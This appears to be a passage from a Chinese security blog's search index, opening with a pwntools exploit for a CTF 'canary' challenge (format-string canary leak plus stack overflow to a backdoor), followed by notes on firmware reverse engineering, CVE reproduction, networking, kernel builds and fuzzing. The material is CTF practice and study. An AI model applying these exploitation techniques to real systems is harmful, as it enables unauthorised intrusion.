class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28964</span>)<br>e = ELF(<span class="hljs-string">&quot;./canary&quot;</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>backdoor = e.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br><br>payload = <span class="hljs-string">b&quot;%p%p%p%p%p%p%p%p%p%p%p&quot;</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Give me some gift?\n&quot;</span>, payload)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)<br><br>leak = p.recvline()<br><br>canary = <span class="hljs-built_in">eval</span>(leak[-<span class="hljs-number">19</span>:-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Show me your magic\n&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>word隐写</title>
    <link href="/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/"/>
    <url>/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h3><p>.docx文件改后缀为.zip</p><p>里面全是xml文件，如下图</p><p>用vscode打开xml时可以用<code>shift alt f</code>进行格式整理（需要装一个xml formatter）</p><p><img src="/img/steganography/1.jpg"></p><p>例如上图中的题目是在document.xml里放了一段密文</p><p>ppt同理</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络知识补习</title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="Ethernet-II-帧"><a href="#Ethernet-II-帧" class="headerlink" title="Ethernet_II 帧"></a>Ethernet_II 帧</h3><p>14个字节</p><blockquote><p>dst MAC + src Mac + Type    =    6 + 6 + 2   =  14Bytes</p></blockquote><p>在数据链路层还会在报文结尾添加FCS（帧校验序列），<strong>但是Wireshark里并不会把他显示出来</strong></p><h3 id="ARP和RARP协议"><a href="#ARP和RARP协议" class="headerlink" title="ARP和RARP协议"></a>ARP和RARP协议</h3><p>（Reverse) Address Resolution Protocal </p><p>将32位网络层地址转为链路层48位MAC地址，逆地址解析协议相反。</p><p>关于属于哪一层协议比较模糊，目前比较多的人认为:</p><blockquote><p>在tcp/ip里属于网络层，在OSI里属于链路层（存疑）</p></blockquote><p><strong>报文格式：</strong></p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp.jpg"></p><p>由<code>Ethernet_II</code>和<code>ARP</code>两部分构成（所以从这里来看还是当成网络层比较好）</p><p>ARP部分共28字节</p><p>包括8字节的报头（硬件类型，上层协议类型，MAC地址长度，IP地址长度，操作类型）</p><p>剩下20字节为：源mac，源IP，目的mac（00填充），目的IP</p><p>某个主机收到一个arp广播之后，查看报文里的IP是不是自己的IP，如果不是就只将对方IP/MAC记录到arp表里</p><blockquote><p>arp -a # 查看arp表</p></blockquote><p>如果是自己的IP，返回</p><blockquote><p>ARP协议在IPV6中不再使用，取代其的是NDP</p></blockquote><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>Internet Control Message Protocol，”主要用来检测网络通信故障和实现链路追踪“</p><p>虽然从报文格式来看，ICMP报文在IP报头之后，但<strong>ICMP属于网络层协议</strong>，常见的用途包括PING和traceRoute</p><p>例如PING：</p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ICMP.jpg"></p><p> 包括8字节的报头，以及后面的报文，PING的报文为32个小写的英文字母（请求和响应都是这个结构）</p><h3 id="内网IP"><a href="#内网IP" class="headerlink" title="内网IP"></a>内网IP</h3><p>因特网分配编号委员会（IANA）保留了3块IP地址做为私有IP地址：</p><p>10.0.0.0 ——— 10.255.255.255</p><p>172.16.0.0——— 172.16.255.255</p><p>192.168.0.0———192.168.255.255</p><h3 id="NAT机制"><a href="#NAT机制" class="headerlink" title="NAT机制"></a>NAT机制</h3><p>Network Address Translation</p><p><strong>静态NAT</strong>：内网IP与公网IP一一对应，静态NAT不能减少公网IP地址的使用</p><p><strong>动态NAT</strong>：将公有地址池以先到先得的方式分配（公网IP少于内网IP）</p><p>**端口地址转换（NAPT/PAT)**：路由器通过报文的IP是0~65535的哪个，决定将报文发送给内网哪台主机</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS解析：UDP协议，端口53</p><p>解析顺序：浏览器缓存，本地Hosts文件，路由器缓存，然后才是DNS服务器解析（循环解析，递归解析）</p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>Dynamic Host Configuration Protocol，UDP协议</p><p>简单来说，DHCP就是一个不需要账号密码登录的、自动给内网机器分配IP地址等信息的协议。</p><p>在DHCP报文开始会有一个op字段，包括：</p><p>请求报文：DHCP Discover、DHCP Request、DHCP Release、DHCP Inform和DHCP Decline。<br>应答报文：DHCP Offer、DHCP ACK和DHCP NAK。</p><p>首先客户端广播（Discover），然后服务器应答（Offer)，客户端选择最先收到的offer进行广播（Request），服务器对其进行IP地址分配（DHCP ACK）</p><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><blockquote><p>为什么要用子网掩码？</p></blockquote><p>分离网络地址和主机地址，两台主机通信时，对子网掩码进行与操作得到网络地址</p><p>网络地址相同，就用ARP协议发现mac地址，如果不同就发送到网关（路由器的IP地址）</p><p>192.168.1.1/30 斜杠后面的就是子网掩码，表示有几个1，例如24就是255.255.255.0</p><blockquote><p>IPv4数据包的选项部分</p></blockquote><p>变长、可选。有一个一字节的选项码。例如</p><p>严格源路由，选项后面会跟着一个列表，数据包必须严格经过上面所有路由器</p><p>宽松源路由，只给出关键点，剩下的由自动路由选择功能补充</p><blockquote><p>广播</p></blockquote><p>受限广播：ip.dst==255.255.255.255，只能本地广播，路由不会转发。（Ether帧的dst是ff:ff:ff:ff:ff:ff）</p><p>直接广播：ip.dst的主机地址全设置为1，网络地址同ip.src（Ether的dst还是6个ff），例如：</p><p>192.168.1.1/30可以发送广播包(192.168.1.7)，使主机192.168.1.5/30 也可以接收到该数据包，前提是之间的路由器要开启定向广播功能。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><blockquote><p>ping of death</p></blockquote><p>数据包分片之后重组，重组之后缓冲区溢出</p><blockquote><p>ICMP Smurf 反射放大攻击</p></blockquote><p>伪造ip.src，大量机器向被攻击主机返回icmp echo</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>英语课笔记</title>
    <link href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/"/>
    <url>/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/</url>
    
    <content type="html"><![CDATA[<p>listening and speaking resources</p><ol><li><p><a href="http://www.ted.com/">www.ted.com</a></p></li><li><p><a href="http://www.bbc.co.uk/learningenglish">www.bbc.co.uk/learningenglish</a></p></li><li><p><a href="http://www.elllo.org/">www.elllo.org</a></p></li></ol><p>academic reading and writing resources</p><ol><li>&lt;<a href="http://www.idebate.org&gt;/">www.idebate.org&gt;</a></li><li><a href="http://www.nottingham.ac.uk/">www.nottingham.ac.uk</a></li><li>academic phrasebank <a href="http://www.phrasebank.manchester.ac.uk/">www.phrasebank.manchester.ac.uk</a></li></ol><p>vocablulary learning tools</p><ol><li><a href="http://www.dictionary.com/">www.dictionary.com</a></li><li><a href="http://www.linguee.com/">www.linguee.com</a></li><li><a href="http://www.wantwords.net/">www.wantwords.net</a></li></ol><p>corpus</p><ol><li>corpus of contemporary American English</li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>英语</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>firmae安装及D-Link DSL-3782仿真</title>
    <link href="/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/"/>
    <url>/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/</url>
    
    <content type="html"><![CDATA[<h3 id="FirmAE安装"><a href="#FirmAE安装" class="headerlink" title="FirmAE安装"></a>FirmAE安装</h3><p><code>https://github.com/pr0v3rbs/FirmAExu</code></p><p>需要注意的点：</p><ol><li>git clone时记得recursive，不能git clone就把 routersploit这个库复制到<code>./analysis</code>里</li><li><code>download.sh</code>里的下载最好自己下来复制到<code>./binaries</code>里</li><li><code>install.sh</code>中 open-jdk-8和fusecram没法直接从apt安装（暂时当它不存在）</li></ol><h3 id="DLink-DSL-3782漏洞复现"><a href="#DLink-DSL-3782漏洞复现" class="headerlink" title="DLink DSL-3782漏洞复现"></a>DLink DSL-3782漏洞复现</h3><p>固件地址：<a href="https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip">https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip</a></p><p>参考方法：<a href="https://bbs.kanxue.com/thread-278413.htm">https://bbs.kanxue.com/thread-278413.htm</a></p><p>先直接把固件跑起来，抄一下exp试一试：</p><p><img src="/img/CVE-2023-27216/1.jpg"></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VxWorks固件函数符号恢复、固件加载地址识别</title>
    <link href="/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/"/>
    <url>/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/</url>
    
    <content type="html"><![CDATA[<h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p><img src="/img/VxWorks/1.jpg"></p><p>参考文章 <a href="https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html">CTFHUB-WriteUp</a></p><p>binwalk提取出名为385的固件，确定是VxWorks内核，并且带有符号表</p><p><img src="/img/VxWorks/2.jpg"></p><p>然后用binwalk -A 确定架构和大小端</p><p><img src="/img/VxWorks/3.jpg"></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>从binwalk结果可以看出符号表在<code>0x301E74</code>附近（这不一定是真实值）</p><p><img src="/img/VxWorks/4.jpg"></p><p>VxWorks符号表每一项由4部分组成，0-3字节是4个<code>00</code>，4-7字节是符号字符串所在内存地址，8-11是符号对应的内容所在地址，12-15字节表示这是一个什么类型的符号。</p><p>如上图，这是一个符号地址在<code>0x27655C</code>，内容在<code>0x1FF058</code>，类型为函数（0x500）的一个符号</p><p>函数名字</p><p>writeup里说可以在这两个地址上直接看到对应的内容，但我的ida里这两个地址上的东西显然不对。。。暂留问题</p><p>（并且ida直接加载我这里一个函数都没有，不知道和writeup使用的差别在哪…）</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>固件逆向</title>
    <link href="/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/"/>
    <url>/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/</url>
    
    <content type="html"><![CDATA[<h4 id="题目1-buuctf-firmware"><a href="#题目1-buuctf-firmware" class="headerlink" title="题目1-buuctf-firmware"></a>题目1-buuctf-firmware</h4><p><a href="https://buuoj.cn/challenges#firmware">https://buuoj.cn/challenges#firmware</a></p><p><img src="/img/firmware/1.jpg"></p><p>使用binwalk提取固件</p><p><img src="/img/firmware/2.jpg"></p><p>可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序</p><p><img src="/img/firmware/3.jpg"></p><p>用upx脱壳后寻找类似网址的字符串，找到以下三个</p><p><img src="/img/firmware/4.jpg"></p><p>首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个</p><p><img src="/img/firmware/5.jpg"></p><p>第二个、第三个只出现在send函数发送的字符串里，显然不对</p><p><img src="/img/firmware/6.jpg"></p><p><img src="/img/firmware/7.jpg"></p><p>因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p><h4 id="题目2-CTFHUB-二次设备固件逆向"><a href="#题目2-CTFHUB-二次设备固件逆向" class="headerlink" title="题目2-CTFHUB-二次设备固件逆向"></a>题目2-CTFHUB-二次设备固件逆向</h4><p>直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串</p><p><img src="/img/firmware/8.jpg"></p><p>打开JZPHMISystem，搜索password字符串</p><p><img src="/img/firmware/9.jpg"></p><p>按x找引用到这里，发现了一个叫做inputPassword的函数</p><p><img src="/img/firmware/10.jpg"></p><p>这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数</p><p><img src="/img/firmware/11.jpg"></p><p>双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码</p><p>然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程</p><p>只不过在rootPasswd这里存在区别</p><p><img src="/img/firmware/12.jpg"></p><p>把这个icspwd提交上去就是对的。。。前面那个689078就不行</p><h4 id="题目3-CTFHUB-简单的固件逆向分析"><a href="#题目3-CTFHUB-简单的固件逆向分析" class="headerlink" title="题目3-CTFHUB-简单的固件逆向分析"></a>题目3-CTFHUB-简单的固件逆向分析</h4><p>用tree查看文件结构之后发现有用的二进制文件只有一个<code>wwwroot/conf/exec/NOE7701.bin</code></p><p>使用binwalk提取出来217和217.zlib两个文件</p><p>用binwalk -A查看217的架构，发现是PowerPC big-endian</p><p><img src="/img/firmware/13.jpg"></p><p>接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 <a href="https://www.cnblogs.com/yangmzh3/p/11231423.html">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p><p><img src="/img/firmware/13_.jpg"></p><p>用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址</p><p><img src="/img/firmware/14.jpg"></p><p><img src="/img/firmware/15.jpg"></p><p>发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名</p><p>从网上找了这个idc脚本，用于恢复VxWorks符号表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 脚本内容 */</span><br><span class="hljs-comment">/* Ruben Santamarta - IOActive */</span><br><span class="hljs-comment">/* Rebuild VxWorks Symbol Table */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>     <span class="hljs-keyword">auto</span> load_addr;<br> <span class="hljs-keyword">auto</span> ea;<br> <span class="hljs-keyword">auto</span> offset;<br> <span class="hljs-keyword">auto</span> sName;<br> <span class="hljs-keyword">auto</span> eaStart;<br> <span class="hljs-keyword">auto</span> eaEnd; <br><br><span class="hljs-comment">// You&#x27;ll need to adjust these values</span><br>load_addr = <span class="hljs-number">0x10000</span>; <span class="hljs-comment">/* 加载地址 */</span> <br>eaStart = <span class="hljs-number">0x301E74</span> + load_addr; <span class="hljs-comment">/* 符号表起始地 */</span><br>eaEnd = <span class="hljs-number">0x3293b4</span> + load_addr; <span class="hljs-comment">/* 符号表结束地址 */</span><br><br> SetStatus(IDA_STATUS_WORK);<br> ea = eaStart;<br> <br> <span class="hljs-keyword">while</span>( ea &lt; eaEnd) &#123;<br> MakeDword( ea );<br> offset = <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">if</span> ( Dword( ea ) == <span class="hljs-number">0x900</span> || Dword( ea ) == <span class="hljs-number">0x500</span>)<br> &#123;<br> offset = <span class="hljs-number">8</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x90000</span> || Dword( ea ) == <span class="hljs-number">0x50000</span> )<br> &#123;<br> offset = <span class="hljs-number">0xc</span>;<br> &#125; <br> <span class="hljs-keyword">if</span>( offset )<br> &#123;<br> MakeStr( Dword( ea - offset ), BADADDR); <br> sName = GetString( Dword( ea - offset ), <span class="hljs-number">-1</span>, ASCSTR_C ) ; <br>  <span class="hljs-keyword">if</span> ( sName )<br>  &#123;<br>  <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x500</span> || Dword( ea ) == <span class="hljs-number">0x50000</span>)<br>  &#123;<br>      <span class="hljs-keyword">if</span> (  GetFunctionName( Dword( ea - offset + <span class="hljs-number">4</span>) ) == <span class="hljs-string">&quot;&quot;</span> )<br>      &#123;<br>      MakeCode( Dword( ea - offset + <span class="hljs-number">4</span>) );<br> MakeFunction( Dword( ea - offset + <span class="hljs-number">4</span>), BADADDR );<br>      &#125;<br>      &#125;<br>  MakeName( Dword( ea - offset + <span class="hljs-number">4</span> ), sName );  <br>  &#125;<br> &#125;<br> ea = ea + <span class="hljs-number">4</span>;   <br> &#125;<br> <br> SetStatus(IDA_STATUS_READY);<br>&#125;<br></code></pre></td></tr></table></figure><p>导入之后函数确实恢复出来了</p><p>如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案…</p><p><img src="/img/firmware/16.jpg"></p><p>不做具体分析了（代码太多</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux kernel 学习</title>
    <link href="/2023/05/01/linux%20kernel/linux%20kernel/"/>
    <url>/2023/05/01/linux%20kernel/linux%20kernel/</url>
    
    <content type="html"><![CDATA[<h3 id="ubuntu源码编译安装"><a href="#ubuntu源码编译安装" class="headerlink" title="ubuntu源码编译安装"></a>ubuntu源码编译安装</h3><p>下载：<a href="https://www.kernel.org/">https://www.kernel.org</a></p><p>必要的编译环境，禁用证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure><p>编译的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install</span><br>sudo make -j4 #代表编译线程个数<br></code></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure><p>打开引导菜单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure><p><img src="/img/kernel/1.jpg"></p><p>多出了新安装的6.3.1的kernel</p><p>重启之后<code>uname -ra</code>会发现内核版本变了</p><h3 id="驱动程序编写"><a href="#驱动程序编写" class="headerlink" title="驱动程序编写"></a>驱动程序编写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hello_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>printk(KERN_EMERG <span class="hljs-string">&quot;Load Hello World\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> hello <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class="hljs-string">&quot;Remove Hello world\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class="hljs-section">all:</span><br>make -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure><p>编译出来的<code>hello.ko</code>，用<code>insmod</code>安装，用<code>rmmod</code>卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo insmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>驱动开发</tag>
      
      <tag>kernel漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FUZZ-AFL</title>
    <link href="/2023/03/15/fuzz/fuzz/"/>
    <url>/2023/03/15/fuzz/fuzz/</url>
    
    <content type="html"><![CDATA[<h3 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h3><p>安装afl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install afl<br></code></pre></td></tr></table></figure><p>写一个在特定输入会崩溃的程序 <code>c1.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> ptr[<span class="hljs-number">20</span>];<br>cin&gt;&gt;ptr;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(ptr,<span class="hljs-string">&quot;deadbeef&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">abort</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>使用afl-g++编译，这样编译出来的程序会被插桩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure><p>创建一个<code>input_folder</code>，这里<code>input_folder</code>里先随便放一个文本文件<code>abc</code>，里面写入<code>hello</code>。</p><p>再创建一个<code>output_folder</code>，什么都不用放进去</p><p>开始对得到的程序进行fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i ./input_folder -o ./output_folder c1.out<br></code></pre></td></tr></table></figure><blockquote><p>因为afl在进行模糊测试的时候是将这个<code>input_folder</code>里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。</p></blockquote><h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>安装angr：直接用docker，dockerhub上有angr的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr 